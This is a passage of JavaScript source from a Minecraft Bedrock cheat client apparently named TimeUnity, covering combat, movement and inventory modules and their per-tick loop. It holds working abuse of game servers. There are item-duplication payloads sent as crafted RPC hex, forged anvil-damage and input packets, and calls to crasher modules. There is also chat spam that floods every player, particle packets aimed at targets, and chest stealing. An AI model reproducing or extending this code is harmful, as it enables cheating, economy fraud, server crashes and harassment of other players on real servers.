                FoundGappleSlot = FallbackGappleSlot;
            }
            if (FoundGappleSlot !== -1) {
                SilentPlayerInventorySlot(FoundGappleSlot, LocalRuntimeId);
                UseSelectItem(FoundGappleSlot);
                if (!AutoGapple_isEating) {
                    AutoGapple_isEating = true;
                    AutoGapple_EatStartTime = Date.now();
                }
            }
        }
        if (AutoGapple_isEating) {
            if (self_Health > AutoGapple_Health || Date.now() - AutoGapple_EatStartTime > AutoGapple_EatingEndTime) {
                let currentSlot = getPlayerSelectItemSlot(self_id);
                SilentPlayerInventorySlot(currentSlot, LocalRuntimeId);
                _minecraft.clientMessage("§l§bTimeUnity §aEating §eGapple");
                AutoGapple_isEating = false;
            }
        }
    }
}

function AutoFood() {
    if (AutoFood_Enabled) {
        if (self_Health <= AutoFood_Health && self_Health > 0) {
            let FoundFoodSlot = -1;
            for (let slot = 0; slot < getPlayerHotBarSize(self_id); slot++) {
                let itemData = getPlayerInventoryItem(self_id, slot);
                if (itemData) {
                    let shortName = getText(itemData, 'Name:"', '"').replace(/^minecraft:/, '');
                    if (shortName === "mushroom_stew") {
                        FoundFoodSlot = slot;
                        break;
                    }
                }
            }
            if (FoundFoodSlot !== -1) {
                SilentPlayerInventorySlot(FoundFoodSlot, LocalRuntimeId);
                UseSelectItem(FoundFoodSlot);
                SilentPlayerInventorySlot(getPlayerSelectItemSlot(self_id), LocalRuntimeId);
            }
        }
    }
}

function CampersAura() {
    if (CampersAura_Enabled) {
        sendNetworkPacket(236, ParseSyncSkinPacket({
            "skinCount": 1,
            "skins": [{
                "skinType": 1,
                "uuid_msb": "16384",
                "uuid_lsb": "9223372040655290225",
                "skinId": "",
                "resourcePatch": "2957018431",
                "imageData": "",
                "itemId": "4644239400124550098",
                "geometryData": "",
                "animationData": "",
                "capeData": "",
                "materialData": "",
                "verified": "",
                "personaPiece": "",
                "pieceTint": "",
                "mappingData": "",
                "capeId": "",
                "udid": ""
            }],
            "packetTail": {
                "platformUserId": "",
                "unknownInt": 0,
                "armSize": "",
                "version": ""
            }
        }, true));
    }
}

function Replication() {
    if (Replication_Enabled && CheckLogin) {
        sendPyRpc(98247598, "93c40172920ec41f4d696e6563726166743a7065743a737761705f7065745f6261675f6974656dc0");
        if (!Replication_Bypas) {
            Replication_Interval++
            if (Replication_Interval >= Replication_Delay) {
                for (let i = 10; i < 15; i++) {
                    sendPyRpc(98247598, `93c4016392${NumtoHex(i)}87c408706c617965724964c4${getHexLengthMarker(self_id)}${AsciiToHex(self_id)}c40b74616b6550657263656e740ac40866726f6d536c6f74c4086974656d42746e31c406746f4974656dc0c40c69734e657752657175657374c3c406746f536c6f74c4086974656d42746e31c40866726f6d4974656dde0010c405636f756e7440c40b6e65774974656d4e616d65c4156d696e6563726166743a6469616d6f6e645f6f7265c4096d6f644974656d4964c400c40b656e6368616e744461746190c40a6475726162696c69747900c4066974656d496438c40a637573746f6d54697073c400c40765787472614964c400c40b6e657741757856616c756500c40e6d6f64456e6368616e744461746190c4056d6f644964c400c4087573657244617461c0c40c69734469676765724974656dc2c4086974656d4e616d65c4156d696e6563726166743a6469616d6f6e645f6f7265c40861757856616c756500c40a73686f77496e48616e64c3c0`);
                }
                if (Replication_Drop) {
                    const Slot = getPlayerSelectItemSlot(self_id);
                    for (let i = 10; i < 15; i++) {
                        _packet.sendPyRpcPacket(98247598, `{\"type\":\"array\",\"value\":[{\"type\":\"binary\",\"value\":\"c\"},{\"type\":\"array\",\"value\":[{\"type\":\"uint\",\"value\":${i}},{\"type\":\"object\",\"value\":[{\"key\":{\"type\":\"binary\",\"value\":\"playerId\"},\"value\":{\"type\":\"binary\",\"value\":\"${self_id}\"}},{\"key\":{\"type\":\"binary\",\"value\":\"takePercent\"},\"value\":{\"type\":\"double\",\"value\":0.6}},{\"key\":{\"type\":\"binary\",\"value\":\"fromSlot\"},\"value\":{\"type\":\"binary\",\"value\":\"itemBtn1\"}},{\"key\":{\"type\":\"binary\",\"value\":\"toItem\"},\"value\":{\"type\":\"nil\"}},{\"key\":{\"type\":\"binary\",\"value\":\"isNewRequest\"},\"value\":{\"type\":\"boolean\",\"value\":true}},{\"key\":{\"type\":\"binary\",\"value\":\"toSlot\"},\"value\":{\"type\":\"uint\",\"value\":${Slot}}},{\"key\":{\"type\":\"binary\",\"value\":\"fromItem\"},\"value\":{\"type\":\"object\",\"value\":[{\"key\":{\"type\":\"binary\",\"value\":\"count\"},\"value\":{\"type\":\"uint\",\"value\":47}},{\"key\":{\"type\":\"binary\",\"value\":\"newItemName\"},\"value\":{\"type\":\"binary\",\"value\":\"minecraft:gold_block\"}},{\"key\":{\"type\":\"binary\",\"value\":\"modItemId\"},\"value\":{\"type\":\"binary\",\"value\":\"\"}},{\"key\":{\"type\":\"binary\",\"value\":\"enchantData\"},\"value\":{\"type\":\"array\",\"value\":[]}},{\"key\":{\"type\":\"binary\",\"value\":\"durability\"},\"value\":{\"type\":\"uint\",\"value\":0}},{\"key\":{\"type\":\"binary\",\"value\":\"itemId\"},\"value\":{\"type\":\"uint\",\"value\":41}},{\"key\":{\"type\":\"binary\",\"value\":\"customTips\"},\"value\":{\"type\":\"binary\",\"value\":\"\"}},{\"key\":{\"type\":\"binary\",\"value\":\"extraId\"},\"value\":{\"type\":\"binary\",\"value\":\"\"}},{\"key\":{\"type\":\"binary\",\"value\":\"newAuxValue\"},\"value\":{\"type\":\"uint\",\"value\":0}},{\"key\":{\"type\":\"binary\",\"value\":\"modEnchantData\"},\"value\":{\"type\":\"array\",\"value\":[]}},{\"key\":{\"type\":\"binary\",\"value\":\"modId\"},\"value\":{\"type\":\"binary\",\"value\":\"\"}},{\"key\":{\"type\":\"binary\",\"value\":\"userData\"},\"value\":{\"type\":\"nil\"}},{\"key\":{\"type\":\"binary\",\"value\":\"isDiggerItem\"},\"value\":{\"type\":\"boolean\",\"value\":false}},{\"key\":{\"type\":\"binary\",\"value\":\"itemName\"},\"value\":{\"type\":\"binary\",\"value\":\"minecraft:gold_block\"}},{\"key\":{\"type\":\"binary\",\"value\":\"auxValue\"},\"value\":{\"type\":\"uint\",\"value\":0}},{\"key\":{\"type\":\"binary\",\"value\":\"showInHand\"},\"value\":{\"type\":\"boolean\",\"value\":true}}]}}]}]},{\"type\":\"nil\"}]}`);
                    }
                    if (Replication_Count === 64) {
                        dropPlayerInventorySlot(self_id, Slot, false, true);
                    } else {
                        for (let r = 1; r < Replication_Count; r++) {
                            dropPlayerInventorySlot(self_id, Slot, false, false);
                        }
                    }
                    Replication_Interval = 0;
                }
            }
        } else {
            Replication_Interval++
            if (Replication_Interval >= Replication_Delay) {
                for (let i = 10; i < 15; i++) {
                    sendPyRpc(98247598, `93c4016392${NumtoHex(i)}87c408706c617965724964c4${getHexLengthMarker(self_id)}${AsciiToHex(self_id)}c40b74616b6550657263656e740ac40866726f6d536c6f74c4086974656d42746e36c406746f4974656dc0c40c69734e657752657175657374c3c406746f536c6f74c4086974656d42746e36c40866726f6d4974656dde0010c405636f756e7440c40b6e65774974656d4e616d65c4156d696e6563726166743a6469616d6f6e645f6f7265c4096d6f644974656d4964c400c40b656e6368616e744461746190c40a6475726162696c69747900c4066974656d496438c40a637573746f6d54697073c400c40765787472614964c400c40b6e657741757856616c756500c40e6d6f64456e6368616e744461746190c4056d6f644964c400c4087573657244617461c0c40c69734469676765724974656dc2c4086974656d4e616d65c4156d696e6563726166743a6469616d6f6e645f6f7265c40861757856616c756500c40a73686f77496e48616e64c3c0`);
                }
                if (Replication_Drop) {
                    const Slot = getPlayerSelectItemSlot(self_id);
                    for (let i = 10; i < 15; i++) {
                        _packet.sendPyRpcPacket(98247598, `{\"type\":\"array\",\"value\":[{\"type\":\"binary\",\"value\":\"c\"},{\"type\":\"array\",\"value\":[{\"type\":\"uint\",\"value\":${i}},{\"type\":\"object\",\"value\":[{\"key\":{\"type\":\"binary\",\"value\":\"playerId\"},\"value\":{\"type\":\"binary\",\"value\":\"${self_id}\"}},{\"key\":{\"type\":\"binary\",\"value\":\"takePercent\"},\"value\":{\"type\":\"double\",\"value\":0.6}},{\"key\":{\"type\":\"binary\",\"value\":\"fromSlot\"},\"value\":{\"type\":\"binary\",\"value\":\"itemBtn6\"}},{\"key\":{\"type\":\"binary\",\"value\":\"toItem\"},\"value\":{\"type\":\"nil\"}},{\"key\":{\"type\":\"binary\",\"value\":\"isNewRequest\"},\"value\":{\"type\":\"boolean\",\"value\":true}},{\"key\":{\"type\":\"binary\",\"value\":\"toSlot\"},\"value\":{\"type\":\"uint\",\"value\":${Slot}}},{\"key\":{\"type\":\"binary\",\"value\":\"fromItem\"},\"value\":{\"type\":\"object\",\"value\":[{\"key\":{\"type\":\"binary\",\"value\":\"count\"},\"value\":{\"type\":\"uint\",\"value\":47}},{\"key\":{\"type\":\"binary\",\"value\":\"newItemName\"},\"value\":{\"type\":\"binary\",\"value\":\"minecraft:gold_block\"}},{\"key\":{\"type\":\"binary\",\"value\":\"modItemId\"},\"value\":{\"type\":\"binary\",\"value\":\"\"}},{\"key\":{\"type\":\"binary\",\"value\":\"enchantData\"},\"value\":{\"type\":\"array\",\"value\":[]}},{\"key\":{\"type\":\"binary\",\"value\":\"durability\"},\"value\":{\"type\":\"uint\",\"value\":0}},{\"key\":{\"type\":\"binary\",\"value\":\"itemId\"},\"value\":{\"type\":\"uint\",\"value\":41}},{\"key\":{\"type\":\"binary\",\"value\":\"customTips\"},\"value\":{\"type\":\"binary\",\"value\":\"\"}},{\"key\":{\"type\":\"binary\",\"value\":\"extraId\"},\"value\":{\"type\":\"binary\",\"value\":\"\"}},{\"key\":{\"type\":\"binary\",\"value\":\"newAuxValue\"},\"value\":{\"type\":\"uint\",\"value\":0}},{\"key\":{\"type\":\"binary\",\"value\":\"modEnchantData\"},\"value\":{\"type\":\"array\",\"value\":[]}},{\"key\":{\"type\":\"binary\",\"value\":\"modId\"},\"value\":{\"type\":\"binary\",\"value\":\"\"}},{\"key\":{\"type\":\"binary\",\"value\":\"userData\"},\"value\":{\"type\":\"nil\"}},{\"key\":{\"type\":\"binary\",\"value\":\"isDiggerItem\"},\"value\":{\"type\":\"boolean\",\"value\":false}},{\"key\":{\"type\":\"binary\",\"value\":\"itemName\"},\"value\":{\"type\":\"binary\",\"value\":\"minecraft:gold_block\"}},{\"key\":{\"type\":\"binary\",\"value\":\"auxValue\"},\"value\":{\"type\":\"uint\",\"value\":0}},{\"key\":{\"type\":\"binary\",\"value\":\"showInHand\"},\"value\":{\"type\":\"boolean\",\"value\":true}}]}}]}]},{\"type\":\"nil\"}]}`);
                    }
                    if (Replication_Count === 64) {
                        dropPlayerInventorySlot(self_id, Slot, false, true);
                    } else {
                        for (let c = 1; c < Replication_Count; c++) {
                            dropPlayerInventorySlot(self_id, Slot, false, false);
                        }
                    }
                    Replication_Interval = 0;
                }
            }
        }
    }
}


function SpeedDestroy() {
    return;
}

function AutoTool() {
    if (AutoTool_Enabled) {
        if (DestroyBlocks && DestroyBlocks.isDestroy) {
            const Block = getBlock(DestroyBlocks.Pos.x, DestroyBlocks.Pos.y, DestroyBlocks.Pos.z);
            let currentSlot = getPlayerSelectItemSlot(self_id);
            let maxD = -Infinity;
            let bestSlot = -1;
            for (let i = 0; i < 9; i++) {
                let d = getPlayerBlockDestroyTime(self_id, i, Block.namespace);
                if (d > maxD) {
                    maxD = d;
                    bestSlot = i;
                } else if (d === maxD && i === currentSlot) {
                    bestSlot = i;
                }
            }
            selectPlayerInventorySlot(self_id, bestSlot);
        }
    }
}

function onPlayerBuildBlockEvent(playerId, x, y, z, side) {
    const Block = getBlock(x, y, z);
    if (AnvilDamage_Enabled) {
        sendNetworkPacket(141, ParseAnvilDamagePacket({
            damage: AnvilDamage_value,
            anvilPos: {
                x: x,
                y: y,
                z: z
            }
        }, true));
        return true;
    }
    const SelectSlot = getPlayerSelectItemSlot(self_id);
    if (PacketDestroy_Enabled) {
        const blockDestroyTime = getPlayerBlockDestroyTime(self_id, SelectSlot, Block.namespace);
        PacketDestroy(x, y, z, blockDestroyTime, PacketDestroy_Number, true);
    }
    if (GodMode_Enabled) {
        sendPlayerAuthInput({
            pos: {
                x: x,
                y: y,
                z: z
            },
            inputs: [24, 37, 52, 53]
        });
    }
    return false;
}

function onEntityBehaviorEvent(entityId, behaviorId, behaviorData) {
    if (Killnsult_Enabled && behaviorId === 3 && attackList.includes(entityId)) {
        const self_name = getEntityName(self_id);
        const victimName = getEntityName(entityId);
        if (self_name && victimName) {
            try {
                const fileContent = _fs.read(_app.getResource() + '/TimeUnity/击杀文本.txt');
                if (fileContent) {
                    const lines = fileContent.split(/\r?\n/).filter(line => line.trim() !== "");
                    if (lines.length > 0) {
                        const randomIndex = Math.floor(Math.random() * lines.length);
                        const messageToSend = lines[randomIndex].replace(/\{name\}/g, victimName).replace(/\{self_name\}/g, self_name);
                        _minecraft.sendChatMessage(messageToSend);
                    }
                }
            } catch (e) {}
        }
    }
    if (KillSound && behaviorId === 3 && attackList.includes(entityId)) {
        KillCount++
        playSound(_app.getResource() + "/TimeUnity/Sound/击杀音效.mp3", 100, 100);
        _minecraft.showTipMessage("§f你击败了 §e" + getEntityName(entityId));
        _minecraft.setTitle("\n\n§c" + KillCount + "杀");
        _minecraft.clientMessage("§d" + getEntityName(self_id) + " §f击败了 §e" + getEntityName(entityId));
    }
    if (SilentKill_Enabled && behaviorId === 3 && attackList.includes(entityId)) {
        if (isPlayer(entityId)) {
            let output = getWorldPlayerList().map(player => player.name);
            output.forEach(player => {
                sendCommandRequest(`/tell "${player}" ` + "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n".repeat(5));
            });
        }
    }
    if (DamageHUD_Enabled && behaviorId === 2 && entityId === self_id) {
        _minecraft.clientMessage(`§l§b[TimeUnity]§r §7>> §cWarning §7>> §r您正在受伤 受伤类型:${behaviorData}`);
    }
    if (AntiHit_Enabled && behaviorId === 2 && entityId === self_id) {
        setEntityMotion(self_id, self_motion.x, 0, self_motion.z)
    }
    if (AutoRetaliate_Enabled && behaviorData === 2 && behaviorId === 2 && entityId === self_id) {
        let closestId = null;
        let minDist = Infinity;
        const targetList = AutoRetaliate_Player ? getPlayerList() : getEntityList();
        for (const targetId of targetList) {
            if (targetId === self_id) continue;
            const dist = getRange(self_pos, getEntityPos(targetId));
            if (dist && dist < minDist) {
                closestId = targetId;
                minDist = dist;
            }
        }
        if (closestId) {
            attackEntity(closestId, true);
        }
    }
    if (DamageHUD_Enabled && behaviorId === 2) {
        attackList = [];
    }
}

let rainbowT = 0.0;

function updateRainbowColor(id) {
    var colors = [{
            r: 1.0,
            g: 0.0,
            b: 0.0,
            a: 1.0
        },
        {
            r: 1.0,
            g: 1.0,
            b: 0.0,
            a: 1.0
        },
        {
            r: 0.0,
            g: 1.0,
            b: 0.0,
            a: 1.0
        },
        {
            r: 0.0,
            g: 1.0,
            b: 1.0,
            a: 1.0
        },
        {
            r: 0.0,
            g: 0.0,
            b: 1.0,
            a: 1.0
        },
        {
            r: 1.0,
            g: 0.0,
            b: 1.0,
            a: 1.0
        },
        {
            r: 1.0,
            g: 0.0,
            b: 0.0,
            a: 1.0
        }
    ];
    var numColors = colors.length;
    var segment = rainbowT * (numColors - 1);
    var index = Math.floor(segment);
    var localT = segment - index;
    var color1 = colors[index];
    var color2 = colors[Math.min(index + 1, numColors - 1)];
    var r = color1.r + (color2.r - color1.r) * localT;
    var g = color1.g + (color2.g - color1.g) * localT;
    var b = color1.b + (color2.b - color1.b) * localT;
    var a = color1.a + (color2.a - color1.a) * localT;
    updateTextColor(id, r, g, b, a);
    rainbowT += 0.005;
    if (rainbowT > 1.0) rainbowT = 0.0;
}

function updateFPSText() {
    try {
        if (FPS_Enabled) {
            updateRainbowColor(FpsId);
            FPSTimer++;
            if (FPSTimer >= 20) {
                FPSTimer = 0;
                updateTextContent(FpsId, `FPS:${getFPS()}`);
                updateTextScale(FpsId, 1.1);
            }
        }
    } catch (e) {}
}

let usedSlots = new Set();

function onTickEvent() {
    try {
        /* 朝向覆盖只在本 tick 内有效：每 tick 开头清一次，tick 内所有
           PlayerAuthInput 共用同一份朝向（同 tick 可能发不止一个包，
           逐个清空会让其余包带着玩家自己的朝向，表现为抽搐）。 */
        SilentRot_data = null;
        /* tick 序号：给「本 tick 是否出手」判定用（见 TU_AttackFullRot）。 */
        globalThis.TU_TickNo = (globalThis.TU_TickNo || 0) + 1;
        self_motion = (m => (m.x !== undefined && m.y !== undefined && m.z !== undefined) ? m : self_motion)(getEntityMotion(self_id));
        self_rot = (r => (r.yaw !== undefined && r.pitch !== undefined) ? r : self_rot)(getEntityRot(self_id));
        self_pos = (p => (p.x !== undefined && p.y !== undefined && p.z !== undefined) ? p : self_pos)(getEntityPos(self_id));
        if (CheckLogin) {
            /* 大陀螺：角度在 tick 里推进（不依赖发包事件）；本地只写渲染层，
               发包由 144 分支覆盖 yaw + headYaw（只转头部会被 ±90° 夹角限制卡住，
               身体一起转才是完整 360°）。第一人称不写本地朝向。 */
            if (MegaTop_Enabled) {
                if (!isFinite(MegaTop_Speed)) MegaTop_Speed = 15;
                MegaTop_yRot = (MegaTop_yRot + MegaTop_Speed) % 360;
                if (_options.getPlayerViewPerspective() !== 0) {
                    /* 只写渲染层：bodyRotation + headRotation。
                       不碰 rotation.yaw —— 移动方向由它合成，写它会让走位跟着
                       转圈（表现就是「能转起来，但走不了直线」）。 */
                    try { setEntityBodyRotPrev(self_id, MegaTop_yRot); } catch (e) { }
                    try { setEntityBodyRot(self_id, MegaTop_yRot); } catch (e) { }
                    try { setEntityHeadRotPrev(self_id, MegaTop_yRot); } catch (e) { }
                    try { setEntityHeadRot(self_id, MegaTop_yRot); } catch (e) { }
                }
            }
            if (KillAura_Enabled) {
                if (KillAura_health && getEntityAttribute(self_id, "minecraft:health").current <= 0) {
                    KillAura_Enabled = false;
                    _minecraft.clientMessage(`§l§b[TimeUnity]§r §7>> §cAuto Disable KillAura`);
                }
                KillAura();
            }
            if (InfiniteAura_Enabled) InfiniteAura();
            if (GodMode_Enabled) GodMode();
            if (AutoBreak_Enabled) AutoBreak();
            if (AntiStarve_Enabled) AntiStarve();
            if (AntiInvis_Enabled) AntiInvis();
            if (SuicideAura_Enabled) SuicideAura();
            if (SetHand_Enabled) SetHand();
            if (AntiLoot_Enabled) AntiLoot();
            if (AntiFox_Enabled) AntiFox();
            if (ChatLock_Enabled) ChatLock();
            if (Structure_Enabled) FillStructure();
            if (AutoLoot_Enabled) AutoLoot();
            if (AutoDrop_Enabled) AutoDrop();
            if (Spammer_Enabled) Spammer();
            if (FakeChat_Enabled) FakeChat();
            if (BunnyHop) SpeedFunc();
            if (TeleMine_Enabled) TeleMine();
            if (Scaffold_Enabled) { if (TU_ScaffoldLegacy) Scaffold(); else TU_Scaffold(); }
            if (AutoGapple_Enabled) AutoGapple();
            if (Fly) FlyFunc();
            if (CoordHUD_Enabled) CoordHUD();
            if (CmdFile_Enabled) CmdFile();
            if (setCamera) setCamera();
            if (TickStop_Enabled) TickStop();
            if (FogRender_Enabled) FogRender();
            if (LowTP_Enabled) LowTP();
            if (MoveCamera_Enabled) MoveCamera();
            if (Timer_Enabled || Blink_Enabled) Timer();
            if (AutoRC_Enabled) AutoRC();
            if (CrystalAura_Enabled) CrystalAura();
            if (invManager_Enabled) invManager();
            if (EnchantMod_Enabled) EnchantMod();
            if (JumpSpeed_Enabled) JumpSpeed();
            if (PacketSleep_Enabled) PacketSleep();
            if (AutoBox_Enabled) AutoBox();
            if (AutoDestroyBed_Enabled) AutoDestroyBed();
            if (BJD_Deputy_Enabled) BJD_Deputy();
            if (ServerChecker_Enabled) ServerChecker();
            if (SpeedDestroy_Enabled) SpeedDestroy();
            if (BJDFly_Enabled) BJDFly();
            if (NoFall_Enabled) NoFall();
            if (BJDSpeed_Enabled) BJDSpeed();
            if (Crasher_Enabled) Crasher();
            if (AutoTool_Enabled) AutoTool();
            if (TransferPlayer_Enabled && TransferPlayer_CycleTP && TransferPlayer_id !== null) {
                TransferPlayer_Timing++;
                if (TransferPlayer_Timing >= 5) {
                    TransferPlayer_Timing = 0;
                    _minecraft.sendChatMessage("TransferPlayers_" + TransferPlayer_id);
                }
            }
            if (Global_InfiniteAura_TargetIds.length > 0) {
                Global_InfiniteAura_Timing++;
                if (Global_InfiniteAura_Timing >= Global_InfiniteAura_Delay) {
                    Global_InfiniteAura_Timing = 0;
                    Global_InfiniteAura_PlayerTP = true;
                    for (let i = 0; i < Global_InfiniteAura_TargetIds.length; i++) {
                        RpcQueue.push(Global_InfiniteAura_TargetIds[i]);
                    }
                    IsRpcReady = false;
                    TickRpc();
                }
            }
            if (ParticleBoom_TargetIds.length > 0) {
                for (let i = 0; i < ParticleBoom_TargetIds.length; i++) {
                    const targetId = ParticleBoom_TargetIds[i];
                    let pos, size;
                    if (targetId === LocalRuntimeId) {
                        pos = self_pos;
                        size = getEntitySize(self_id);
                        pos.y -= 1.62;
                    } else {
                        const PlayerMoveData = ParticleBoom_PlayerMoveData[targetId];
                        if (!PlayerMoveData) continue;
                        pos = PlayerMoveData.pos;
                        pos.y -= 1.62;
                        size = getEntitySize(self_id);
                    }
                    if (ParticleBoom_ShowParticle) DrawParticle(3, pos, size, 2);
                    sendParticlePacket(targetId);
                }
            }
            if (RpcData !== "" && PyRpcTube_Cycle) {
                PyRpcTube_Interval++
                if (PyRpcTube_Interval >= PyRpcTube_Delay) {
                    sendPyRpc(98247598, RpcData);
                    PyRpcTube_Interval = 0;
                }
            }
            if (Critical_Enabled) {
                if (Critical_isAttack && Critical_AttackTarget !== null) {
                    attackEntity(Critical_AttackTarget, true);
                    Critical_SilentRot = null;
                    Critical_isAttack = false;
                    Critical_AttackTarget = null;
                } else {
                    Critical_SilentRot = null;
                }
            }
            if (Replication_Enabled) Replication();
            if (DropCarriedItem_Enabled) DropCarriedItem();
            if (SummonFox_Enabled) SummonFox();
            if (AutoCrasher_Enabled) AutoCrasher();
            if (AntiVoid_Enabled) AntiVoid();
            if (PleaseForCommand) sendCommand(PleaseCommand);
            if (AutoFood_Enabled) AutoFood();
            if (CampersAura_Enabled) CampersAura();
            if (ModifyTime) {
                if (!_app.isInGame()) return;
                let ModifyTime_Value = ModifyTime_Time * 500;
                if (!ModifyRain) {
                    setWorldData({
                        time: ModifyTime_Value,
                        rainTime: ModifyTime_WorldData.rainTime,
                        rainLevel: ModifyTime_WorldData.rainLevel
                    });
                } else {
                    setWorldData({
                        time: ModifyTime_Value,
                        rainTime: 1,
                        rainLevel: 1
                    });
                }
            }
            if (MoveJump) {
                if (getEntityFlag(self_id, 34)) {
                    if (getEntityIsGround(self_id)) {
                        _input.buttonDown("button.jump");
                    }
                } else {
                    _input.buttonUp("button.jump");
                }
            }
            if (Hammer_isAttack && Hammer_AttackTarget !== null && Hammer_Enabled && getText(getEntityCarriedItem(self_id), 'Name:"', '"').replace(/^minecraft:/, '') === "mace") {
                if (!Hammer_ModifyPos) {
                    for (let i = 0; i < Hammer_AttackHeight; i++) {
                        sendPlayerAuthInput({
                            pos: {
                                x: self_pos.x,
                                y: -80,
                                z: self_pos.z
                            }
                        });
                    }
                    Hammer_ModifyPos = true;
                } else {
                    Hammer_ModifyPos = false;
                    const Target_Pos = getEntityPos(Hammer_AttackTarget);
                    sendPlayerAuthInput({
                        pos: {
                            x: Target_Pos.x,
                            y: Target_Pos.y,
                            z: Target_Pos.z
                        }
                    });
                    InfiniteAura_attackEntity(Hammer_AttackTarget, true, Target_Pos);
                    Hammer_isAttack = false;
                    Hammer_AttackTarget = null;
                }
            } else if (Hammer_isAttack && Hammer_Enabled) {
                Hammer_isAttack = false;
                Hammer_ModifyPos = false;
                Hammer_AttackTarget = null;
            }
            if (ChestStealer_Enabled && ContainerContent && ContainerContent.items && ContainerOpenState === "Chest") {
                if (ContainerContent.stealerIndex === undefined) {
                    ContainerContent.stealerIndex = 0;
                }
                ChestStealer_Timing++;
                if (ChestStealer_Timing >= ChestStealer_Delay) {
                    const invSize = getPlayerInventorySize(self_id);
                    let movedCount = 0;
                    while (ContainerContent.stealerIndex < ContainerContent.itemCount && movedCount < ChestStealer_Quantity) {
                        const fromSlot = ContainerContent.stealerIndex;
                        const item = ContainerContent.items[fromSlot];
                        ContainerContent.stealerIndex++;
                        if (item && item.networkId !== 0) {
                            let toSlot = -1;
                            for (let i = 0; i < invSize; i++) {
                                if (usedSlots.has(i)) continue;
                                const invItem = getInventoryItem(i);
                                if (!invItem || invItem.namespace === "minecraft:air") {
                                    toSlot = i;
                                    usedSlots.add(i);
                                    break;
                                }
                            }
                            if (toSlot !== -1) {
                                sendItemStackRequest([{
                                    type: 1,
                                    count: item.count,
                                    source: {
                                        containerId: 7,
                                        windowId: 0,
                                        slot: fromSlot,
                                        stackId: item.stackId || 0
                                    },
                                    destination: {
                                        containerId: getContainerId("auto", toSlot),
                                        windowId: 0,
                                        slot: toSlot,
                                        stackId: 0
                                    }
                                }]);
                                item.networkId = 0;
                                movedCount++;
                            } else {
                                break;
                            }
                        }
                    }
                    if (ContainerContent.stealerIndex >= ContainerContent.itemCount || movedCount === 0) {
                        if (ChestStealer_SilentMode) {
                            closeContainer(ContainerContent.windowId);
                        } else if (ChestStealer_Automatic) {
                            deleteContainer();
                        }
                        ContainerContent = null;
                        usedSlots.clear();
                    }
                    ChestStealer_Timing = 0;
                }
            }
            if (LockNight_Enabled) setEntityEffect(self_id, {
                'id': 16,
                'duration': 1,
                'amplifier': 1,
                'displayOnScreenTextureAnimation': false,
                'noCounter': true,
                'effectVisible': false
            });
            if (AirHand) {
                callModule(38, JSON.stringify({
                    scale: true,
                    scale_x: 0.820,
                    scale_y: 0.680,
                    scale_z: AirHand_fov / 100,
                    value: true
                }));
            }
            if (Scaffold_Shapes.length !== 0) Scaffold_UpdateShape();
            if (DestroyBlockRender_Enabled) DestroyBlockRender();
            if (FPS_Enabled) updateFPSText();
            if (ChatLock_Enabled && _app.isInGame()) ChatLock_Name = getPlayerNameList();
            if (Beacon_Packet_Enabled) Beacon_Packet();
            if (AutoSprint_Enabled) AutoSprint();
            if (ticks % at_max_time === 0) at_current = 0;
            ticks++;
        }
    } catch (e) {}
}

function onLeaveGameEvent() {
    if (CheckLogin) {
        if (AutoBox_History.length > 0) {
            AutoBox_RemoveShape();
        }
        if (NoOnlineKick_Enabled && NoOnlineKick_LobbyGame !== null) {
            curl_post_game_api("https://g79apigatewayobt.minecraft.cn/online-lobby-room-enter/", JSON.stringify({
                "password": "",
                "room_id": NoOnlineKick_LobbyGame,
                "lobby_manifest_version": "",
                "check_visibilily": 1
            }), function(code, response) {
                NoOnlineKick_LobbyGame = null;
            });
        }
    }
}

function FogRender() {
    if (_app.isInGame()) {
        FogColorConfig.Progress += 0.0033 * FogColorConfig.Speed;
        if (FogColorConfig.Progress > 1) FogColorConfig.Progress = 0;
        const t = FogColorConfig.Progress;
        const c1r = FogColorConfig.Color1.r / 255.0;
        const c1g = FogColorConfig.Color1.g / 255.0;
        const c1b = FogColorConfig.Color1.b / 255.0;
        const c2r = FogColorConfig.Color2.r / 255.0;
        const c2g = FogColorConfig.Color2.g / 255.0;
        const c2b = FogColorConfig.Color2.b / 255.0;
        let fogR, fogG, fogB;
        if (t < 0.5) {
            fogR = c1r + (c2r - c1r) * (t * 2);
            fogG = c1g + (c2g - c1g) * (t * 2);
            fogB = c1b + (c2b - c1b) * (t * 2);
        } else {
            fogR = c2r + (c1r - c2r) * ((t - 0.5) * 2);
            fogG = c2g + (c1g - c2g) * ((t - 0.5) * 2);
            fogB = c2b + (c1b - c2b) * ((t - 0.5) * 2);
        }
        const FogStart = 10.0;
        const FogEnd = FogColorConfig.FogRange;
        _app.evalPython(`
import mod.client.extraClientApi as clientApi
fogComp = clientApi.GetEngineCompFactory().CreateFog("${self_id}")
fogComp.SetFogColor((${fogR}, ${fogG}, ${fogB}, 0))
fogComp.SetFogLength(${FogStart}, ${FogEnd})
`);
    }
}

function CheckStructure() {
    const StructureMap = {
        "minecraft:village": "村庄",
        "minecraft:stronghold": "末地要塞",
        "minecraft:shipwreck": "沉船",
        "minecraft:mansion": "林地府邸",
        "minecraft:monument": "海底神殿",
        "minecraft:pillager_outpost": "掠夺者哨塔",
        "minecraft:end_city": "末地城",
        "minecraft:fortress": "下界要塞",
        "minecraft:bastion_remnant": "猪灵堡垒",
        "minecraft:end_portal": "末地传送门",
        "minecraft:ancient_city": "远古城市",
        "minecraft:mineshaft": "废弃矿井",
        "minecraft:buried_treasure": "埋藏的宝藏",
        "minecraft:ruined_portal": "废弃传送门",
        "minecraft:ruins": "海底废墟",
        "minecraft:temple": "沙漠/雪屋/丛林/沼泽",
        "minecraft:trial_chambers": "试炼之地"
    };
    const StructureName = Object.values(StructureMap);
    const StructureType = Object.keys(StructureMap);
    const Find_List = JSON.stringify({
        type: "custom_form",
        title: "查询结构",
        content: [{
            type: "dropdown",
            text: "请选择要查询的结构:",
            options: StructureName
        }, {
            type: "toggle",
            text: "自动传送",
            default: false
        }]
    });
    _gui.addForm(Find_List, function(StructureList, StructureTP) {
        if (StructureList !== null) {
            const StructureNames = StructureName[StructureList];
            const StructureTypes = StructureType[StructureList];
            const StructurePos = findStructure(self_pos.x, self_pos.y, self_pos.z, StructureTypes);
            if (StructurePos.x !== undefined && StructurePos.y !== undefined && StructurePos.z !== undefined) {
                _minecraft.clientMessage(`§l§b[TimeUnity]§r §7>> §a${StructureNames} §7>> §6坐标: §e${StructurePos.x} ${StructurePos.y} ${StructurePos.z}`);
                if (StructureTP) setEntityPos(self_id, StructurePos.x + 1.62, StructurePos.y, StructurePos.z);
            } else {
                _minecraft.clientMessage("§l§b[TimeUnity]§r §7>> §c找不到此遗迹");
            }
        } else {
